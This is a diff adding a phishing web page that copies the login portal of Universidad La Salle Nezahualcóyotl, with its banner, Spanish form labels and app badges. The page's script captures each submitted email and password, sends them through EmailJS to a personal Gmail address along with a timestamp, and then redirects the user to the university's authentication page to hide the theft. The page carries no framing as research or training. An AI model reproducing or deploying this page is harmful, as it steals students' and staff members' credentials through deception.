@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Universidad La Salle Nezahualcóyotl</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("C7G3QIdHURceX0Np_");
+        })();
+    </script>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: url('https://www.lasalle.edu.mx/media/banner/encabezado.jpg') no-repeat center;
+            background-size: cover;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .login-container img {
+            max-width: 80%;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+        .form-group label {
+            text-align: left;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .form-group .input-with-icon {
+            position: relative;
+        }
+        .form-group .input-with-icon input {
+            padding-right: 30px;
+        }
+        .form-group .input-with-icon .icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 16px;
+            color: #999;
+        }
+        button {
+            background-color: #005cb9;
+            border: none;
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #003f7e;
+        }
+        .links {
+            margin-top: 10px;
+        }
+        .links a {
+            display: block;
+            font-size: 14px;
+            text-decoration: none;
+            color: #005cb9;
+            margin-top: 5px;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .app-links {
+            margin-top: 20px;
+        }
+        .app-links a {
+            display: inline-block;
+            margin: 0 10px;
+        }
+        .app-links img {
+            max-width: 100px;
+        }
+        #error-message {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="salle.png" alt="Logo La Salle">
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <label for="email">Correo electrónico</label>
+                <div class="input-with-icon">
+                    <input type="email" id="email" name="email" required>
+                    <i class="fas fa-user icon"></i>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <div class="input-with-icon">
+                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
+                    <i class="fas fa-eye toggle-password" id="togglePassword"></i>
+                </div>
+            </div>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        <div class="links">
+            <a href="#">Activar mi cuenta</a>
+            <a href="#">Olvidé mi contraseña</a>
+        </div>
+        <div class="app-links">
+            <a href="#">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/512px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
+            </a>
+            <a href="#">
+                <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store">
+            </a>
+        </div>
+        <div id="error-message"></div>
+    </div>
+
+    <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+
+        togglePassword.addEventListener('click', () => {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            togglePassword.classList.toggle('fa-eye');
+            togglePassword.classList.toggle('fa-eye-slash');
+        });
+
+        function handleLogin(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('error-message');
+
+            if (!email || !password) {
+                errorMessage.textContent = "Por favor, ingresa tu correo y contraseña.";
+                return;
+            }
+
+            emailjs.send("service_raji7bg", "template_jydtckf", {
+                from_name: "Sistema de Inicio de Sesión",
+                to_email: "dano.alexper@gmail.com",
+                message: `Intento de Inicio de Sesión:\nCorreo: ${email}\nContraseña: ${password}\nFecha: ${new Date().toLocaleString()}`
+            }).then(
+                function(response) {
+                    console.log("Correo enviado", response.status, response.text);
+                    window.location.href = "https://ulsaneza.academic.lat/Autenticacion.aspx";
+                },
+                function(error) {
+                    console.log("Error al enviar correo", error);
+                    window.location.href = "https://ulsaneza.academic.lat/Autenticacion.aspx";
+                }
+            ).catch(error => {
+                console.error("Error en el proceso de inicio de sesión:", error);
+                errorMessage.textContent = "Hubo un problema. Intenta de nuevo.";
+            });
+        }
+    </script>
+</body>
+</html>
